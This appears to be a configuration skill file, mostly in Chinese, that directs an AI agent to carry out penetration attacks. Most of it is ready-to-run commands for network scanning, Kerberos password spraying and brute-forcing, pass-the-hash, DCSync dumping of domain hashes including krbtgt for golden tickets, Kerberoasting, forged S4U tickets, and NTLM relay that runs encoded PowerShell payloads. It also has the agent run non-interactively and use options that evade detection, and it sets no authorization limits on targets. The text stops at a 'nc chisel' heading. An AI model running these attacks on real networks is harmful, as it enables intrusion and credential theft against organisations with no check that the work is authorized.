---
name: redteam
description: RedTeam penetration testing agent skill. Use this for network scanning, web fingerprinting, vulnerability detection, AD domain attacks, lateral movement, credential harvesting, browser information extraction with tools like gogo, fscan, httpx, nuclei, ffuf, dnsx, kerbrute, nxc, impacket, playwright.
---

#  AI 执行的底层通用指导原则

1. **防阻塞与交互死锁**:
   - 这些黑客工具必须以**完全非交互方式**运行，不触发密码输入或确认提示。
   - 监听类阻塞型工具（如 ntlmrelayx.py）须用 isBackground=true 后台执行并设置周期超时。

2. **防上下文过载 (Context Overflow)**:
   - 扫描输出大时，**将结果重定向到文件**（如 > result.txt），再用 Select-String / findstr / Get-Content 按关键字提取。
   - 善用各工具的静默参数（gogo: -q；fscan: -silent；httpx: -silent；nuclei: -nc；ffuf: -s）。

3. **渐进式探测法（黄金工作流）**:
   gogo (存活/端口/协议识别)  httpx (Web 指纹/标题/状态码)  nuclei (精确漏洞验证) / ffuf (路径爆破)

---

##  工具一：gogo (极速资产与协议指纹探针)

**二进制路径**: d:\mcp\redteam-tools\gogo.exe

**核心参数**（来自 gogo -h）：

- -i <IP/CIDR> : 目标 IP 或网段，支持逗号分隔多目标
- -p <ports>   : 端口，支持数字/范围/预设别名（top1/top2/win/db/smb/oxid 等）
- -m <mode>    : 扫描模式 default / s (smart) / ss (supersmart) / sc
- --ping        : ICMP 存活预探测
- -v            : 启用主动指纹扫描
- -e            : 启用漏洞利用模板扫描
- -q            : 安静模式（防输出过载必加）
- -f <file>     : 结果输出到文件
- --af           : 自动命名输出文件
- -t <n>        : 并发线程数
- -d <n>        : 超时秒数（默认 2）
- -l <file>     : 从文件读取目标列表

**实战指令**:

  # 单目标常见端口快扫
  gogo -i 10.10.26.107 -p top2,win,db -v

---

##  工具二：fscan (内网综合大杀器)

**二进制路径**: d:\mcp\redteam-tools\fscan.exe

**核心参数**（来自 fscan -h）：

- -h <target>   : 目标 IP/网段（必填，如 192.168.1.1/24）
- -p <ports>    : 端口（默认含常见 21/22/80/445/3306/6379 等）
- -pa <port>    : 追加端口到默认列表
- -np           : 不 ping（禁 ICMP 时必加）
- -nobr         : 不爆破弱口令（加速）
- -nopoc        : 不跑 Web PoC
- -silent       : 安静模式
- -nocolor      : 关闭颜色（重定向文件时必加）
- -o <file>     : 输出文件（默认 result.txt）
- -t <n>        : 线程数（默认 600）
- -time <n>     : 超时秒数（默认 3）
- -m <type>     : 只扫特定服务（ssh/smb/etc）
- -pocname <name> : 只跑含关键字的 PoC（如 weblogic）
- -json         : JSON 格式输出

**实战指令**:

  # 快速内网打点
  fscan -h 10.10.26.0/24 -np -nobr -silent -nocolor -o fscan_result.txt

  # 提取漏洞命中行
  Select-String -Path fscan_result.txt -Pattern "\[\+\]|Vulnerable|MS17|Weblogic|Shiro"

  # 只跑特定 PoC
  fscan -h 10.10.26.107 -np -nobr -pocname weblogic

---

##  工具三：httpx (高并发 HTTP 探针与指纹识别)

**二进制路径**: d:\mcp\redteam-tools\httpx.exe

**核心参数**（来自 httpx -h）：

- -u / -target <url>  : 单个目标 URL
- -l / -list <file>   : 从文件读取目标
- -sc / -status-code  : 显示状态码
- -title              : 显示页面标题
- -server             : 显示 Server 头（等同 -web-server）
- -td / -tech-detect  : 显示技术栈指纹（Wappalyzer）
- -cl / -content-length : 显示响应长度
- -ip                 : 显示解析 IP
- -silent             : 只输出结果行
- -nc / -no-color     : 关闭颜色
- -fc <codes>         : 过滤状态码（如 -fc 404）
- -mc <codes>         : 只保留指定状态码
- -timeout <n>        : 超时秒数
- -o <file>           : 输出文件

**实战指令**:

  # 单目标详细指纹（正确参数）
  httpx -u http://10.10.26.107:8080 -sc -title -server -td -ip -silent

  # 批量探测，过滤 404
  httpx -l urls.txt -sc -title -server -td -silent -fc 404 -o httpx_result.txt

 注意：-server（不是 -web-server）；-td（不是 -tech-detect 短形）；-sc（不是 -status-code）。两种都支持但短参更稳。

---

##  工具四：nuclei (基于 YAML 模板的精确漏洞扫描器)

**二进制路径**: d:\mcp\redteam-tools\nuclei.exe

**核心参数**（来自 nuclei -h）：

- -u / -target <url>  : 单个目标
- -l / -list <file>   : 目标列表文件
- -t / -templates <path> : 模板路径/目录（如 cves/ technologies/ exposed-panels/）
- -tags <tags>        : 按标签筛选（逗号分隔，如 cve,rce,sqli）
- -s / -severity <v>  : 按严重性筛选（info/low/medium/high/critical）
- -as                 : 自动识别技术栈并匹配标签
- -nc / -no-color     : 关闭颜色（比 -silent 更安全，不会屏蔽结果）
- -o / -output <file> : 输出文件
- -j / -jsonl         : JSONL 格式输出
- -etags <tags>       : 排除标签
- -id <id>            : 按模板 ID 运行
- -nt                 : 只运行最新模板

**实战指令**:

  # 自动识别技术栈爆高危洞
  nuclei -u http://10.10.26.107:8080 -as -s high,critical -nc

  # 指定模板目录
  nuclei -u http://10.10.26.107:8080 -t technologies/ -nc

  # 按 CVE 标签
  nuclei -u http://10.10.26.107:8080 -tags cve,rce -s high,critical -nc -o nuclei_result.txt

  # 批量目标
  nuclei -l urls.txt -tags shiro,weblogic,log4j -s critical -nc -o nuclei_result.txt

 注意：
- -t 是模板路径；-s 是严重性；-tags 是标签。
- -it 是 -include-templates（路径），不是 "-it tags cve" 这种用法，标签必须用 -tags。
- -silent 会屏蔽所有输出包括漏洞结果，用 -nc 代替。

---

##  工具五：ffuf (超音速 HTTP Fuzzer)

**二进制路径**: d:\mcp\redteam-tools\ffuf.exe

**核心参数**（来自 ffuf -h）：

- -u <url>      : 目标 URL，含 FUZZ 占位符（必填）
- -w <wordlist> : 字典文件路径（必填）
- -mc <codes>   : 匹配状态码（如 -mc 200,301,302）
- -fc <codes>   : 过滤状态码
- -fs <size>    : 按响应长度过滤干扰页
- -t <n>        : 并发数（默认 40）
- -s            : 安静模式
- -o <file>     : 输出文件
- -H <header>   : 自定义请求头
- -e <exts>     : 追加扩展名（如 -e .php,.bak,.zip）
- -r            : 跟随重定向
- -timeout <n>  : 超时秒数

**实战指令**:

  # 基础目录爆破
  ffuf -u http://10.10.26.107:8080/FUZZ -w d:\mcp\redteam-tools\dict.txt -mc 200,301,302 -s

  # 带扩展名查备份文件
  ffuf -u http://10.10.26.107:8080/FUZZ -w d:\mcp\redteam-tools\dict.txt -e .php,.bak,.zip,.sql -mc 200 -s

  # 过滤固定长度干扰
  ffuf -u http://target.com/FUZZ -w dict.txt -mc 200,301 -fs 1234 -s

  # VHost 枚举
  ffuf -u http://10.10.26.107/ -H "Host: FUZZ.corp.local" -w subdomains.txt -mc 200 -s

---

##  工具六：dnsx (DNS 解析与子域名枚举)

**二进制路径**: d:\mcp\redteam-tools\dnsx.exe

**实战指令**:

  # 子域名枚举
  dnsx -d corp.local -w subdomains.txt -resp -silent

  # 批量反查 IP
  dnsx -l domains.txt -resp -a -silent -o resolved.txt

---

##  工具七：kerbrute (Kerberos 用户枚举与密码喷洒)

**二进制路径**: d:\mcp\redteam-tools\kerbrute.exe

**子命令**：

| 子命令 | 用途 |
|--------|------|
| `userenum` | 枚举域内有效用户名（无需凭据，利用 Kerberos AS-REQ） |
| `passwordspray` | 单密码喷洒用户列表（避免锁定) |
| `bruteuser` | 对单个用户暴力破解密码 |
| `bruteforce` | 用户名:密码组合字典爆破 |

**核心参数**：

- `-d / --domain <domain>` : 目标域名（必填）
- `--dc <ip>`              : 域控 IP（不填则 DNS 自动解析）
- `-t <n>`                 : 并发线程数（默认 10）
- `-o <file>`              : 输出有效结果到文件
- `-v`                     : 详细输出（显示失败）
- `--downgrade`            : 强制降级到 RC4（绕过部分检测）
- `--safe`                 : 安全模式，跳过已锁定账户

**实战指令**:

  # 用户名枚举（不需要密码，最低权限侦查）
  kerbrute userenum -d corp.local --dc 192.168.1.10 users.txt -o valid_users.txt

  # 密码喷洒（单密码 × 用户列表，推荐加 --safe 防锁定）
  kerbrute passwordspray -d corp.local --dc 192.168.1.10 valid_users.txt 'Password123!' --safe -o spray_result.txt

  # 暴力破解单用户
  kerbrute bruteuser -d corp.local --dc 192.168.1.10 administrator passwords.txt

  # 用户名:密码组合爆破
  kerbrute bruteforce -d corp.local --dc 192.168.1.10 combos.txt -t 20

 注意：
- kerbrute 直接与域控 88 端口通信，**无需加入域**即可枚举用户。
- passwordspray 每账户只尝试一次，适合生产域；bruteuser 会触发锁定策略。
- 输出文件中以 `VALID USERNAME` 标注有效用户，可直接作为后续 impacket / nxc 的用户列表。

---

##  Python 系域渗透工具包 (nxc / Impacket)

> **Impacket / nxc / bloodhound-python 已由 install_tools.py 统一安装。**
> Agent 直接按以下规则调用，无需验证安装状态。
>
> **Impacket Windows 调用规则**（优先级）：
> 1. `impacket-<工具名>` 入口点（推荐）： `impacket-wmiexec`
> 2. fallback：`python -m impacket.examples.<工具名>`
>
> | 脚本名 (.py) | Windows 调用命令 |
> |---|---|
> | wmiexec.py | `impacket-wmiexec` |
> | psexec.py | `impacket-psexec` |
> | secretsdump.py | `impacket-secretsdump` |
> | GetNPUsers.py | `impacket-GetNPUsers` |
> | GetUserSPNs.py | `impacket-GetUserSPNs` |
> | getST.py | `impacket-getST` |
> | ntlmrelayx.py | `impacket-ntlmrelayx` |
>
> 所有 impacket 工具均为**非交互式**，密码/哈希必须内联传参。

---

### NetExec (nxc)  内网横向渗透控制台

支持协议: smb / ssh / winrm / wmi / mssql / rdp / vnc / ftp / ldap / nfs

  # SMB 验证 + 枚举共享
  nxc smb 10.10.26.107 -u Administrator -p 'Admin@123' --shares

  # PtH（-H 传 NT Hash）
  nxc smb 192.168.1.10 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:NTHASH

  # WinRM 执行命令
  nxc winrm 10.10.26.107 -u Administrator -p 'Admin@123' -x 'whoami /all'

  # 枚举域用户
  nxc smb 10.10.26.107 -u user -p pass --users

  # 本地账户喷洒整个网段
  nxc smb 192.168.1.0/24 -u Administrator -p 'Admin@123' --local-auth

---

### Impacket  wmiexec / psexec（远程命令执行）

  # wmiexec 无文件执行（最隐蔽）— Windows 入口点
  impacket-wmiexec domain/Administrator:password@10.10.26.107 'whoami'

  # PtH 执行（冒号前 LM Hash 可留空）
  impacket-wmiexec -hashes :NTHASH domain/Administrator@10.10.26.107 'ipconfig /all'

  # psexec（落地服务，可得 SYSTEM）
  impacket-psexec domain/Administrator:password@10.10.26.107 cmd.exe

  # fallback：python -m 方式
  python -m impacket.examples.wmiexec domain/Administrator:password@10.10.26.107 'whoami'

---

### Impacket  secretsdump（凭据提取 / DCSync）

  # DCSync 导出全域 Hash（需要域管权限）— Windows 入口点
  impacket-secretsdump corp.local/Administrator:password@192.168.1.dc -just-dc

  # PtH 模式
  impacket-secretsdump -hashes :NTHASH corp.local/Administrator@192.168.1.dc -just-dc

  # 只导出单个用户（如 krbtgt 做黄金票据）
  impacket-secretsdump corp.local/Administrator:password@192.168.1.dc -just-dc-user krbtgt

  # 提取本机 SAM/LSA（本地 admin 即可）
  impacket-secretsdump Administrator:password@10.10.26.107

  # fallback：python -m 方式
  python -m impacket.examples.secretsdump corp.local/Administrator:password@192.168.1.dc -just-dc

---

### bloodhound-python (AD 权限图谱收集)

  # 收集所有 AD 数据
  bloodhound-python -d corp.local -u lowpriv_user -p password -dc 192.168.1.10 -c All --zip

  # 只收集会话和 ACL
  bloodhound-python -d corp.local -u user -p pass -dc 192.168.1.10 -c Session,ACL

---

### Impacket  Kerberoasting / AS-REP Roasting

  # AS-REP Roasting — Windows 入口点
  impacket-GetNPUsers corp.local/user:pass -dc-ip 192.168.1.10 -request -format hashcat -outputfile asrep_hashes.txt

  # 无密码匿名尝试
  impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt -dc-ip 192.168.1.10 -format hashcat

  # Kerberoasting
  impacket-GetUserSPNs corp.local/user:pass -dc-ip 192.168.1.10 -request -outputfile kerb_hashes.txt

  # fallback：python -m 方式
  python -m impacket.examples.GetNPUsers corp.local/user:pass -dc-ip 192.168.1.10 -request -format hashcat

---

### Impacket  getST（S4U 委派伪造票据）

  # RBCD 伪造 Administrator 票据 — Windows 入口点
  impacket-getST -spn cifs/target.corp.local -impersonate Administrator -dc-ip 192.168.1.10 corp.local/machine_account:password

  # PtH 模式
  impacket-getST -spn cifs/target.corp.local -impersonate Administrator -hashes :NTHASH -dc-ip 192.168.1.10 corp.local/machine_account

  # Windows 加载票据（PowerShell）
  $env:KRB5CCNAME = "Administrator.ccache"
  # 或
  [Environment]::SetEnvironmentVariable("KRB5CCNAME", "Administrator.ccache")

  # fallback：python -m 方式
  python -m impacket.examples.getST -spn cifs/target.corp.local -impersonate Administrator -dc-ip 192.168.1.10 corp.local/machine_account:password

---

### Impacket  ntlmrelayx（NTLM 中继攻击）

> ⚠️ 此工具是长期监听型！必须使用 **invoke_ntlmrelayx MCP Tool** 或 run_in_terminal isBackground=true 后台运行并设置超时时间。
> 直接调用方式（Windows 入口点）：

  # 中继到 LDAP — Windows 入口点
  impacket-ntlmrelayx -t ldap://192.168.1.dc --smb2support

  # 中继到 SMB 执行命令
  impacket-ntlmrelayx -t smb://192.168.1.10 --smb2support -c "whoami > C:\result.txt"

  # 多目标中继
  impacket-ntlmrelayx -tf targets.txt --smb2support -c "powershell -enc BASE64_PAYLOAD"

  # fallback：python -m 方式
  python -m impacket.examples.ntlmrelayx -t ldap://192.168.1.dc --smb2support

> 注意：invoke_ntlmrelayx MCP Tool 已封装好后台执行逻辑，优先使用它而非手动 run_in_terminal。

---

### nc chisel 